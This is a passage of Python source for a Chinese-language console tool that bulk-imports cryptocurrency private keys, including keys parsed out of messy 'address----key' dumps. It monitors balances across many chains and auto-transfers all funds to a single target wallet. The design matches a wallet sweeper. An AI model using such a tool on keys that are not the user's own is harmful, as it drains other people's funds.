                print(f"{Fore.RED}❌ 系统错误: {error_msg}{Style.RESET_ALL}")
                
                # 根据错误类型提供不同的处理建议
                if "network" in error_msg.lower() or "connection" in error_msg.lower():
                    print(f"{Fore.YELLOW}💡 建议：检查网络连接或尝试选项 4 重新初始化RPC连接{Style.RESET_ALL}")
                elif "memory" in error_msg.lower():
                    print(f"{Fore.YELLOW}💡 建议：尝试选项 's' 进行智能优化清理内存{Style.RESET_ALL}")
                elif "permission" in error_msg.lower():
                    print(f"{Fore.YELLOW}💡 建议：检查文件权限或以管理员身份运行{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}💡 建议：重试操作或联系技术支持{Style.RESET_ALL}")
                
                # 自动恢复尝试
                if self.automation_configs.get('auto_retry_failed_operations', True):
                    print(f"{Fore.CYAN}🔄 尝试自动恢复...{Style.RESET_ALL}")
                    try:
                        self.optimize_performance()
                        print(f"{Fore.GREEN}✅ 自动恢复成功{Style.RESET_ALL}")
                    except:
                        print(f"{Fore.YELLOW}⚠️ 自动恢复失败，请手动处理{Style.RESET_ALL}")
                
                try:
                    self.safe_input(f"\n{Fore.MAGENTA}按回车键继续...{Style.RESET_ALL}")
                except:
                    print(f"{Fore.YELLOW}继续运行...{Style.RESET_ALL}")
                    pass

    def menu_add_private_key(self):
        """菜单：添加私钥（增强版本）"""
        self.start_operation_timer("add_private_key")
        
        print(f"\n{Fore.CYAN}✨ ====== 🔑 智能钱包私钥管理 🔑 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.YELLOW}{Fore.BLACK} 🚀 增强功能：批量导入、智能验证、自动去重 {Style.RESET_ALL}")
        
        # 显示增强提示
        tips = self.get_enhanced_tips('add_wallet')
        for tip in tips:
            print(f"{Fore.BLUE}{tip}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}📋 输入方式选择：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 📝 手动输入单个私钥")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 📋 批量粘贴多个私钥")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 📁 从文件导入私钥")
        print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回主菜单")
        
        # 使用智能输入
        input_method = self.enhanced_input(
            f"\n{Fore.YELLOW}请选择输入方式: {Style.RESET_ALL}",
            default="1",
            choices=['0', '1', '2', '3'],
            menu_name='add_private_key'
        )
        
        if input_method == '0':
            return
        
        lines = []
        
        if input_method == '1':
            # 单个私钥输入（支持智能解析）
            print(f"\n{Fore.GREEN}🔍 请输入私钥（支持智能解析）：{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 支持混合格式：地址----私钥、纯私钥等{Style.RESET_ALL}")
            private_key_input = self.safe_input().strip()
            if private_key_input:
                # 尝试智能解析
                extracted_keys = self.extract_private_keys_from_text(private_key_input)
                if extracted_keys:
                    print(f"{Fore.GREEN}🎉 智能解析成功！提取到 {len(extracted_keys)} 个私钥{Style.RESET_ALL}")
                    lines = extracted_keys
                else:
                    # 直接使用原始输入
                    lines = [private_key_input]
        
        elif input_method == '2':
            # 批量输入（支持智能解析）
            print(f"\n{Fore.GREEN}📋 批量私钥输入（支持智能解析乱码数据）：{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 智能模式：直接粘贴包含私钥的混合数据，系统会自动提取{Style.RESET_ALL}")
            print(f"{Fore.CYAN}   支持格式：0x地址----0x私钥、纯私钥、混合乱码等{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}   输入完成后双击回车确认{Style.RESET_ALL}")
            
            empty_line_count = 0
            raw_input_lines = []
            
            while True:
                try:
                    line = self.safe_input().strip()
                    if line:
                        raw_input_lines.append(line)
                        empty_line_count = 0
                        print(f"{Fore.CYAN}✅ 已接收第 {len(raw_input_lines)} 行数据{Style.RESET_ALL}")
                    else:
                        empty_line_count += 1
                        if empty_line_count >= 2:
                            break
                except EOFError:
                    break
            
            # 智能解析所有输入的数据
            if raw_input_lines:
                print(f"\n{Fore.BLUE}🔍 正在智能解析 {len(raw_input_lines)} 行数据...{Style.RESET_ALL}")
                
                # 将所有行合并进行智能解析
                combined_text = '\n'.join(raw_input_lines)
                extracted_keys = self.extract_private_keys_from_text(combined_text)
                
                if extracted_keys:
                    print(f"{Fore.GREEN}🎉 智能解析成功！从混合数据中提取到 {len(extracted_keys)} 个有效私钥{Style.RESET_ALL}")
                    lines = extracted_keys
                    
                    # 显示提取的私钥预览（脱敏显示）
                    print(f"\n{Fore.CYAN}📋 提取的私钥预览：{Style.RESET_ALL}")
                    for i, key in enumerate(extracted_keys[:5], 1):  # 最多显示5个
                        masked_key = key[:6] + "..." + key[-4:]
                        print(f"  {i}. {masked_key}")
                    if len(extracted_keys) > 5:
                        print(f"  ... 还有 {len(extracted_keys) - 5} 个私钥")
                else:
                    print(f"{Fore.YELLOW}⚠️ 未能从输入数据中提取到有效私钥{Style.RESET_ALL}")
                    # 回退到原始逐行处理
                    lines = raw_input_lines
        
        elif input_method == '3':
            # 从文件导入（支持智能解析）
            print(f"\n{Fore.GREEN}📁 从文件导入私钥（支持智能解析）：{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 支持混合格式文件，系统会自动提取有效私钥{Style.RESET_ALL}")
            file_path = self.safe_input(f"{Fore.CYAN}请输入文件路径: {Style.RESET_ALL}").strip()
            
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read()
                    
                    print(f"{Fore.BLUE}🔍 正在智能解析文件内容...{Style.RESET_ALL}")
                    
                    # 尝试智能解析
                    extracted_keys = self.extract_private_keys_from_text(file_content)
                    
                    if extracted_keys:
                        print(f"{Fore.GREEN}🎉 智能解析成功！从文件中提取到 {len(extracted_keys)} 个有效私钥{Style.RESET_ALL}")
                        lines = extracted_keys
                        
                        # 显示提取的私钥预览（脱敏显示）
                        print(f"\n{Fore.CYAN}📋 提取的私钥预览：{Style.RESET_ALL}")
                        for i, key in enumerate(extracted_keys[:3], 1):  # 文件模式显示3个
                            masked_key = key[:6] + "..." + key[-4:]
                            print(f"  {i}. {masked_key}")
                        if len(extracted_keys) > 3:
                            print(f"  ... 还有 {len(extracted_keys) - 3} 个私钥")
                    else:
                        # 回退到原始逐行处理
                        lines = [line.strip() for line in file_content.split('\n') if line.strip()]
                        print(f"{Fore.YELLOW}⚠️ 智能解析未找到私钥，回退到逐行处理模式{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}✅ 从文件读取到 {len(lines)} 行数据{Style.RESET_ALL}")
                        
                except Exception as e:
                    print(f"{Fore.RED}❌ 读取文件失败: {e}{Style.RESET_ALL}")
                    self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
                    return
        
        # 处理私钥
        if lines:
            print(f"\n{Fore.CYAN}🔄 正在处理 {len(lines)} 个私钥...{Style.RESET_ALL}")
            success_count = 0
            invalid_count = 0
            duplicate_count = 0
            
            for i, private_key in enumerate(lines):
                # 显示进度
                self.show_progress_indicator(i + 1, len(lines), "验证私钥")
                
                # 验证并添加私钥
                result = self.add_private_key(private_key)
                if result == "success":
                    success_count += 1
                elif result == "duplicate":
                    duplicate_count += 1
                else:
                    invalid_count += 1
                
                time.sleep(0.1)  # 小延迟显示进度
            
            # 操作完成统计
            operation_time = self.end_operation_timer("add_private_key")
            
            print(f"\n{Fore.GREEN}🎉 批量导入完成！{Style.RESET_ALL}")
            print(f"┌─────────────────────────────────────────┐")
            print(f"│ ✅ 成功添加: {Fore.GREEN}{success_count:>3}{Style.RESET_ALL} 个           │")
            print(f"│ 🔄 重复跳过: {Fore.YELLOW}{duplicate_count:>3}{Style.RESET_ALL} 个           │")
            print(f"│ ❌ 无效私钥: {Fore.RED}{invalid_count:>3}{Style.RESET_ALL} 个           │")
            print(f"│ ⏱️ 处理耗时: {Fore.CYAN}{operation_time:.2f}s{Style.RESET_ALL}        │")
            print(f"└─────────────────────────────────────────┘")
            
            if success_count > 0:
                print(f"\n{Fore.CYAN}💡 建议下一步：选择主菜单选项 4 初始化网络连接{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️  未输入任何私钥{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_user_experience_settings(self):
        """菜单：用户体验设置"""
        print(f"\n{Fore.CYAN}✨ ====== 🎛️ 用户体验个性化设置 🎛️ ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 🎨 自定义您的使用体验，让操作更加便捷 {Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}⚙️ 当前设置：{Style.RESET_ALL}")
            print(f"┌─────────────────────────────────────────────────────────┐")
            
            settings = [
                ("smart_defaults", "🧠 智能默认值", "自动选择最佳选项"),
                ("remember_choices", "🧠 记住选择", "记录用户偏好"),
                ("quick_navigation", "⚡ 快速导航", "显示最近选择"),
                ("progress_indicators", "📊 进度指示器", "显示操作进度"),
                ("enhanced_tips", "💡 增强提示", "智能提示信息"),
                ("auto_confirm_actions", "✅ 自动确认", "自动确认常见操作"),
                ("show_advanced_options", "🔧 高级选项", "显示详细信息")
            ]
            
            for i, (key, name, desc) in enumerate(settings, 1):
                status = "🟢 启用" if self.user_preferences.get(key, True) else "🔴 禁用"
                print(f"│ {i}. {name:<12} {status:<8} {Fore.CYAN}{desc}{Style.RESET_ALL}{'':>10}│")
            
            print(f"│ 8. 🔄 重置为默认设置                               │")
            print(f"│ 9. 📊 查看使用统计                                 │")
            print(f"│ 0. 🔙 返回主菜单                                   │")
            print(f"└─────────────────────────────────────────────────────────┘")
            
            choice = self.enhanced_input(
                f"\n{Fore.YELLOW}请选择要修改的设置 (0-9): {Style.RESET_ALL}",
                choices=[str(i) for i in range(10)],
                menu_name='user_experience'
            )
            
            if choice == '0':
                break
            elif choice == '8':
                # 重置为默认设置
                self.user_preferences = {
                    'auto_confirm_actions': False,
                    'show_advanced_options': False,
                    'remember_choices': True,
                    'quick_navigation': True,
                    'smart_defaults': True,
                    'progress_indicators': True,
                    'enhanced_tips': True
                }
                print(f"\n{Fore.GREEN}✅ 已重置为默认设置{Style.RESET_ALL}")
                time.sleep(1)
            elif choice == '9':
                # 显示使用统计
                self._show_usage_statistics()
            elif choice.isdigit() and 1 <= int(choice) <= 7:
                # 切换设置
                setting_index = int(choice) - 1
                key = settings[setting_index][0]
                current_value = self.user_preferences.get(key, True)
                self.user_preferences[key] = not current_value
                
                status = "启用" if not current_value else "禁用"
                print(f"\n{Fore.GREEN}✅ {settings[setting_index][1]} 已{status}{Style.RESET_ALL}")
                time.sleep(1)
        
        print(f"\n{Fore.GREEN}💾 用户设置已保存{Style.RESET_ALL}")
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
    
    def _show_usage_statistics(self):
        """显示使用统计"""
        print(f"\n{Fore.CYAN}📊 使用统计报告{Style.RESET_ALL}")
        print(f"┌─────────────────────────────────────────────────────────┐")
        
        if self.choice_history:
            print(f"│ 📈 菜单使用频率统计：                               │")
            for menu_name, choices in self.choice_history.items():
                print(f"│   {menu_name:<20} {len(choices):>3} 次操作          │")
            
            print(f"│                                                     │")
            print(f"│ 🔥 热门选择：                                       │")
            if self.popular_choices:
                sorted_choices = sorted(self.popular_choices.items(), key=lambda x: x[1], reverse=True)
                for choice, count in sorted_choices[:5]:
                    menu, option = choice.split(':', 1)
                    print(f"│   {menu}-{option:<15} {count:>3} 次               │")
        else:
            print(f"│ 暂无使用统计数据                                   │")
        
        # 缓存统计
        if hasattr(self, 'smart_cache'):
            cache_stats = self.smart_cache.get_stats()
            print(f"│                                                     │")
            print(f"│ 💾 缓存统计：                                       │")
            print(f"│   总缓存项: {cache_stats['total_size']:>3}                             │")
            for level, size in cache_stats['cache_sizes'].items():
                print(f"│   {level:<10} 缓存: {size:>3} 项                    │")
        
        print(f"└─────────────────────────────────────────────────────────┘")
        self.safe_input(f"\n{Fore.YELLOW}按回车键继续...{Style.RESET_ALL}")

    def menu_show_addresses(self):
        """菜单：显示地址（增强版本）"""
        self.start_operation_timer("show_addresses")
        
        print(f"\n{Fore.CYAN}✨ ====== 📋 智能钱包管理中心 📋 ====== ✨{Style.RESET_ALL}")
        
        if not self.wallets:
            print(f"\n{Fore.YELLOW}😭 暂无钱包地址，请先添加钱包{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 提示：使用菜单选项 1 添加私钥{Style.RESET_ALL}")
            
            # 提供快速添加选项
            if self.user_preferences.get('auto_confirm_actions', False):
                print(f"\n{Back.GREEN}{Fore.WHITE} 🚀 快速操作 {Style.RESET_ALL}")
                add_now = self.enhanced_input(
                    f"{Fore.YELLOW}是否立即添加钱包? (y/N): {Style.RESET_ALL}",
                    default="n",
                    menu_name='quick_add_wallet'
                )
                if add_now.lower() == 'y':
                    self.menu_add_private_key()
                    return
        else:
            print(f"\n{Fore.GREEN}💼 钱包管理中心 - 共有 {len(self.wallets)} 个钱包：{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            
            for i, address in enumerate(self.wallets.keys(), 1):
                status = f"{Fore.GREEN}🟢 监控中{Style.RESET_ALL}" if address in self.monitored_addresses else f"{Fore.RED}🔴 未监控{Style.RESET_ALL}"
                
                # 显示详细地址信息
                short_address = f"{address[:10]}...{address[-8:]}"
                print(f"{Fore.YELLOW}{i:2d}.{Style.RESET_ALL} {Fore.WHITE}{short_address}{Style.RESET_ALL} {status}")
                
                # 从缓存获取余额信息
                balance_key = f"balance_{address}"
                balance_info = self.smart_cache.get(balance_key, "wallet_balances", "未获取")
                print(f"    {Fore.CYAN}💰 余额: {balance_info}{Style.RESET_ALL}")
                
                # 每5个地址显示一次分割线
                if i % 5 == 0 and i < len(self.wallets):
                    print(f"{Fore.CYAN}─" * 40 + f"{Style.RESET_ALL}")
            
            # 显示统计信息
            operation_time = self.end_operation_timer("show_addresses")
            print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}📊 钱包统计: 总计 {len(self.wallets)} 个 | 监控中 {len(self.monitored_addresses)} 个 | 加载耗时 {operation_time:.2f}s{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_start_monitoring(self):
        """菜单：开始监控"""
        print(f"\n{Fore.CYAN}✨ ====== 🚀 开始监控 🚀 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.GREEN}{Fore.BLACK} 🔍 正在检查系统状态... {Style.RESET_ALL}")
        
        if self.start_monitoring():
            print(f"\n{Fore.GREEN}🎉 监控已成功启动！{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🔄 系统将自动监控所有钱包余额并转账到目标账户{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}❌ 监控启动失败！{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_stop_monitoring(self):
        """菜单：停止监控"""
        print(f"\n{Fore.CYAN}✨ ====== ⏹️ 停止监控 ⏹️ ====== ✨{Style.RESET_ALL}")
        print(f"{Back.RED}{Fore.WHITE} ⚠️ 正在安全停止监控系统... {Style.RESET_ALL}")
        
        self.stop_monitoring()
        print(f"\n{Fore.GREEN}✅ 监控已安全停止{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💾 所有数据已保存{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")



    def menu_set_target_wallet(self):
        """菜单：设置目标账户"""
        print(f"\n{Fore.CYAN}✨ ====== 🎯 设置目标账户 🎯 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 📝 提示：所有监控到的余额将自动转账到这个地址 {Style.RESET_ALL}")
        
        if self.target_wallet:
            print(f"\n💼 当前目标账户: {Fore.GREEN}{self.target_wallet}{Style.RESET_ALL}")
        else:
            print(f"\n⚠️  当前状态: {Fore.RED}未设置目标账户{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}🔍 请输入新的目标钱包地址：{Style.RESET_ALL}")
        new_address = self.safe_input(f"{Fore.CYAN}➜ {Style.RESET_ALL}").strip()
        
        if new_address:
            if new_address.startswith('0x') and len(new_address) == 42:
                self.target_wallet = new_address
                self.save_wallets()  # 保存更新
                print(f"\n{Fore.GREEN}✅ 成功！目标账户已设置为: {new_address}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🚀 现在就可以开始监控转账了！{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ 错误！无效的钱包地址格式{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}📝 正确格式示例: 0x1234567890abcdef1234567890abcdef12345678{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️  取消设置{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_import_keys(self):
        """菜单：批量导入私钥"""
        print(f"\n{Fore.CYAN}✨ ====== 📁 批量导入私钥 📁 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.GREEN}{Fore.BLACK} 📝 支持的文件格式：每行一个私钥 (.txt文件) {Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}📂 请输入私钥文件路径：{Style.RESET_ALL}")
        file_path = self.safe_input(f"{Fore.CYAN}➜ {Style.RESET_ALL}").strip()
        
        if file_path and os.path.exists(file_path):
            print(f"\n{Fore.BLUE}🔄 正在导入私钥...{Style.RESET_ALL}")
            count = self.import_private_keys_from_file(file_path)
            if count > 0:
                print(f"\n{Fore.GREEN}🎉 导入成功！共添加 {count} 个钱包{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}⚠️  未成功导入任何钱包{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}❌ 错误！文件不存在 或 路径无效{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_show_status(self):
        """菜单：显示监控状态"""
        print(f"\n{Fore.CYAN}✨ ====== 📊 系统状态详情 📊 ====== ✨{Style.RESET_ALL}")
        
        # 基本信息
        print(f"\n{Fore.YELLOW}💼 基本信息：{Style.RESET_ALL}")
        print(f"  🔑 总钱包数量: {Fore.GREEN}{len(self.wallets)}{Style.RESET_ALL} 个")
        print(f"  🔍 监控地址: {Fore.GREEN}{len(self.monitored_addresses)}{Style.RESET_ALL} 个")
        print(f"  🌐 网络连接: {Fore.GREEN}{len(self.web3_connections)}{Style.RESET_ALL} 个")
        blocked_count = sum(len(nets) for nets in self.blocked_networks.values())
        if blocked_count > 0:
            print(f"  🚫 屏蔽网络: {Fore.RED}{blocked_count}{Style.RESET_ALL} 个 {Fore.YELLOW}(无交易历史){Style.RESET_ALL}")
        
        # 监控状态
        status_color = Fore.GREEN if self.monitoring else Fore.RED
        status_icon = "🟢" if self.monitoring else "🔴"
        status_text = "运行中" if self.monitoring else "已停止"
        print(f"\n{Fore.YELLOW}🔄 监控状态：{Style.RESET_ALL}")
        print(f"  {status_icon} 状态: {status_color}{status_text}{Style.RESET_ALL}")
        
        # 转账配置
        print(f"\n{Fore.YELLOW}💸 转账配置：{Style.RESET_ALL}")
        if self.target_wallet:
            print(f"  🎯 目标账户: {Fore.GREEN}{self.target_wallet[:10]}...{self.target_wallet[-8:]}{Style.RESET_ALL}")
        else:
            print(f"  🎯 目标账户: {Fore.RED}未设置{Style.RESET_ALL}")
        print(f"  ⏱️ 监控间隔: {Fore.GREEN}{self.monitor_interval}{Style.RESET_ALL} 秒")
        print(f"  💰 最小转账: {Fore.GREEN}{self.min_transfer_amount}{Style.RESET_ALL} ETH")
        
        # 支持的代币信息
        print(f"\n{Fore.YELLOW}🪙 支持的代币：{Style.RESET_ALL}")
        print(f"  {Fore.BLUE}💎 原生代币{Style.RESET_ALL}: ETH, BNB, MATIC, AVAX 等")
        print(f"  {Fore.GREEN}🪙 ERC20代币{Style.RESET_ALL}: {Fore.CYAN}{len(self.tokens)}{Style.RESET_ALL} 种")
        
        # 显示代币详情
        for token_symbol, token_config in self.tokens.items():
            networks_count = len(token_config['contracts'])
            print(f"    • {Fore.YELLOW}{token_symbol}{Style.RESET_ALL} ({token_config['name']}) - {Fore.CYAN}{networks_count}{Style.RESET_ALL} 个网络")
            
        # 智能Gas功能
        print(f"\n{Fore.YELLOW}⚡ 智能功能：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}✅{Style.RESET_ALL} 🧠 智能Gas估算")
        print(f"  {Fore.GREEN}✅{Style.RESET_ALL} 🔍 全链代币扫描")
        print(f"  {Fore.GREEN}✅{Style.RESET_ALL} 💰 自动转账判断")
        print(f"  {Fore.GREEN}✅{Style.RESET_ALL} 🚫 无效网络屏蔽")
        print(f"  {Fore.GREEN}✅{Style.RESET_ALL} 📱 Telegram实时通知")
        
        # Telegram通知配置
        print(f"\n{Fore.YELLOW}📱 Telegram通知：{Style.RESET_ALL}")
        tg_status = f"{Fore.GREEN}已启用{Style.RESET_ALL}" if self.telegram_enabled else f"{Fore.RED}已禁用{Style.RESET_ALL}"
        print(f"  📡 状态: {tg_status}")
        if self.telegram_enabled:
            print(f"  🤖 Bot ID: {self.telegram_bot_token.split(':')[0]}")
            print(f"  💬 Chat ID: {self.telegram_chat_id}")
        
        # 转账统计
        stats = self.transfer_stats
        success_rate = (stats['successful_transfers'] / stats['total_attempts'] * 100) if stats['total_attempts'] > 0 else 0
        print(f"\n{Fore.YELLOW}📊 转账统计：{Style.RESET_ALL}")
        print(f"  📈 总尝试: {Fore.CYAN}{stats['total_attempts']}{Style.RESET_ALL} 次")
        print(f"  ✅ 成功: {Fore.GREEN}{stats['successful_transfers']}{Style.RESET_ALL} 次")
        print(f"  ❌ 失败: {Fore.RED}{stats['failed_transfers']}{Style.RESET_ALL} 次")
        print(f"  📊 成功率: {Fore.YELLOW}{success_rate:.1f}%{Style.RESET_ALL}")
        print(f"  💰 总价值: {Fore.GREEN}{stats['total_value_transferred']:.6f}{Style.RESET_ALL} ETH等价值")
        
        if stats['by_network']:
            print(f"\n{Fore.YELLOW}🌐 网络统计：{Style.RESET_ALL}")
            for network, net_stats in list(stats['by_network'].items())[:5]:  # 只显示前5个
                network_name = self.networks.get(network, {}).get('name', network)[:20]
                print(f"  • {network_name}: {Fore.GREEN}✅{net_stats['success']}{Style.RESET_ALL} {Fore.RED}❌{net_stats['failed']}{Style.RESET_ALL}")
            
        if stats['by_token']:
            print(f"\n{Fore.YELLOW}🪙 代币统计：{Style.RESET_ALL}")
            for token, token_stats in list(stats['by_token'].items())[:5]:  # 只显示前5个
                print(f"  • {token}: {Fore.GREEN}✅{token_stats['success']}{Style.RESET_ALL} {Fore.RED}❌{token_stats['failed']}{Style.RESET_ALL}")
                if token_stats['amount'] > 0:
                    print(f"    💰 总额: {token_stats['amount']:.6f}")
        
        if self.monitored_addresses:
            print(f"\n{Fore.YELLOW}🔍 监控地址详情:{Style.RESET_ALL}")
            for addr, info in self.monitored_addresses.items():
                networks = ', '.join(info['networks'])
                last_check = datetime.fromtimestamp(info['last_check']).strftime('%Y-%m-%d %H:%M:%S')
                print(f"  {Fore.GREEN}✅{Style.RESET_ALL} {Fore.CYAN}{addr[:8]}...{addr[-6:]}{Style.RESET_ALL} | 🌐 {Fore.YELLOW}{len(info['networks'])}{Style.RESET_ALL} 个网络 | 🕒 {last_check}")
        
        if self.blocked_networks:
            print(f"\n{Fore.YELLOW}🚫 屏蔽网络详情:{Style.RESET_ALL}")
            for addr, networks in self.blocked_networks.items():
                print(f"  {Fore.RED}❌{Style.RESET_ALL} {Fore.CYAN}{addr[:8]}...{addr[-6:]}{Style.RESET_ALL} | 🚫 {Fore.RED}{len(networks)}{Style.RESET_ALL} 个网络 {Fore.YELLOW}(无交易历史){Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")

    def menu_settings(self):
        """菜单：智能参数设置（增强版本）"""
        self.start_operation_timer("settings_menu")
        
        print(f"\n{Fore.CYAN}✨ ====== ⚙️ 智能监控参数设置 ⚙️ ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 🧠 智能推荐配置，根据网络状况自动优化 {Style.RESET_ALL}")
        
        # 显示增强提示
        tips = self.get_enhanced_tips('settings')
        for tip in tips:
            print(f"{Fore.BLUE}{tip}{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}🔧 当前配置参数：{Style.RESET_ALL}")
            print(f"┌─────────────────────────────────────────────────────────┐")
            print(f"│ 1. ⏱️ 监控间隔:    {Fore.CYAN}{self.monitor_interval:>5}{Style.RESET_ALL} 秒                       │")
            print(f"│ 2. 💰 最小转账:    {Fore.CYAN}{self.min_transfer_amount:>8.4f}{Style.RESET_ALL} ETH                  │")
            print(f"│ 3. ⛽ Gas价格:     {Fore.CYAN}{self.gas_price_gwei:>5}{Style.RESET_ALL} Gwei                     │")
            print(f"│ 4. 🎯 目标账户管理                                      │")
            print(f"│ 5. 🔧 高级网络设置                                      │")
            print(f"│ 6. 📊 性能优化配置                                      │")
            print(f"│ 7. 💾 自动保存设置                                      │")
            print(f"│ 0. 🔙 返回主菜单                                        │")
            print(f"└─────────────────────────────────────────────────────────┘")
            
            # 显示智能调速状态
            if hasattr(self, 'throttler') and self.throttler_enabled:
                try:
                    throttler_stats = self.throttler.get_stats_summary()
                    print(f"\n{Fore.CYAN}⚡ 智能调速状态 (全自动优化):{Style.RESET_ALL}")
                    print(f"  🔧 当前并发数: {Fore.YELLOW}{throttler_stats.get('current_workers', 0)}{Style.RESET_ALL}")
                    print(f"  💚 健康RPC: {Fore.YELLOW}{throttler_stats.get('healthy_rpcs', 0)}/{throttler_stats.get('total_rpcs', 0)}{Style.RESET_ALL}")
                    print(f"  📊 平均健康度: {Fore.YELLOW}{throttler_stats.get('avg_health', 0):.2f}{Style.RESET_ALL}")
                except:
                    print(f"\n{Fore.YELLOW}⚡ 智能调速: 待初始化{Style.RESET_ALL}")
            
            # 智能推荐
            if self.user_preferences.get('smart_defaults', True):
                print(f"\n{Fore.GREEN}🧠 智能推荐：{Style.RESET_ALL}")
                
                # 根据网络状况推荐间隔
                if len(self.web3_connections) > 10:
                    rec_interval = 15  # 网络充足时提高频率
                elif len(self.web3_connections) > 5:
                    rec_interval = 30  # 中等网络
                else:
                    rec_interval = 60  # 网络较少时降低频率
                
                if self.monitor_interval != rec_interval:
                    print(f"  💡 建议监控间隔: {rec_interval}秒 (当前: {self.monitor_interval}秒)")
                
                # Gas价格推荐
                if hasattr(self, 'web3_connections') and 'ethereum' in self.web3_connections:
                    try:
                        current_gas = self.web3_connections['ethereum'].eth.gas_price
                        recommended_gas = int(current_gas * 1.1 / 10**9)  # 建议稍高于当前gas
                        if abs(self.gas_price_gwei - recommended_gas) > 5:
                            print(f"  ⛽ 建议Gas价格: {recommended_gas} Gwei (当前: {self.gas_price_gwei} Gwei)")
                    except:
                        pass
            
            choice = self.enhanced_input(
                f"\n{Fore.YELLOW}🔢 请选择要修改的参数 (0-7): {Style.RESET_ALL}",
                choices=[str(i) for i in range(8)],
                menu_name='settings_main'
            )
            
            if choice == '0':
                break
            
            try:
                if choice == '1':
                    self._configure_monitor_interval()
                elif choice == '2':
                    self._configure_min_transfer()
                elif choice == '3':
                    self._configure_gas_price()
                elif choice == '4':
                    self._configure_target_account()
                elif choice == '5':
                    self._configure_network_settings()
                elif choice == '6':
                    self._configure_performance()
                elif choice == '7':
                    self._auto_save_settings()
                
            except Exception as e:
                print(f"\n{Fore.RED}❌ 设置失败: {e}{Style.RESET_ALL}")
                self.safe_input(f"{Fore.YELLOW}按回车键继续...{Style.RESET_ALL}")
        
        operation_time = self.end_operation_timer("settings_menu")
        print(f"\n{Fore.GREEN}💾 所有设置已保存 (耗时: {operation_time:.2f}s){Style.RESET_ALL}")
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
    
    def _configure_monitor_interval(self):
        """配置监控间隔"""
        print(f"\n{Fore.CYAN}⏱️ 监控间隔配置{Style.RESET_ALL}")
        print(f"当前间隔: {self.monitor_interval} 秒")
        
        # 提供预设选项
        presets = [
            (10, "高频模式 - 适合活跃交易"),
            (30, "标准模式 - 平衡性能和效果"),
            (60, "节能模式 - 减少系统负载"),
            (300, "轻量模式 - 长期监控")
        ]
        
        print(f"\n{Fore.YELLOW}预设选项：{Style.RESET_ALL}")
        for i, (interval, desc) in enumerate(presets, 1):
            print(f"  {i}. {interval}秒 - {desc}")
        print(f"  5. 自定义间隔")
        
        choice = self.enhanced_input(
            f"\n{Fore.YELLOW}选择模式 (1-5): {Style.RESET_ALL}",
            default="2",
            choices=['1', '2', '3', '4', '5'],
            menu_name='monitor_interval'
        )
        
        if choice in ['1', '2', '3', '4']:
            interval = presets[int(choice) - 1][0]
            self.monitor_interval = interval
            print(f"\n{Fore.GREEN}✅ 监控间隔已设置为 {interval} 秒{Style.RESET_ALL}")
        elif choice == '5':
            try:
                custom_interval = int(self.safe_input(f"{Fore.CYAN}请输入自定义间隔（秒，5-3600）: {Style.RESET_ALL}") or "30")
                if 5 <= custom_interval <= 3600:
                    self.monitor_interval = custom_interval
                    print(f"\n{Fore.GREEN}✅ 自定义监控间隔已设置为 {custom_interval} 秒{Style.RESET_ALL}")
                else:
